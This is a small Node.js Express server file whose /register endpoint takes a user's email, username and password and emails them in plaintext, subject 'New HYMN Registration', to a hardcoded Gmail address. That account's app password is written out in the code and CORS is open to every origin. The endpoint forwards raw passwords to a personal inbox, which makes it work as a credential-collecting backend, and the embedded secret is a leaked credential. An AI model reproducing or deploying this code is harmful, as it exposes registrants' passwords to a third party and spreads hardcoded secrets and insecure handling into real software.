const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

app.post('/register', async (req, res) => {
  const { email, username, password } = req.body;

  if (!email || !username || !password) {
    return res.status(400).json({ message: 'Missing required fields' });
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'relectance@gmail.com',
      pass: 'ihwkpphszffhsfcu'
    }
  });

  const mailOptions = {
    from: 'relectance@gmail.com',
    to: 'relectance@gmail.com',
    subject: `New HYMN Registration: ${username}`,
    text: `Email: ${email}\nUsername: ${username}\nPassword: ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ message: 'Email sent successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Failed to send email' });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});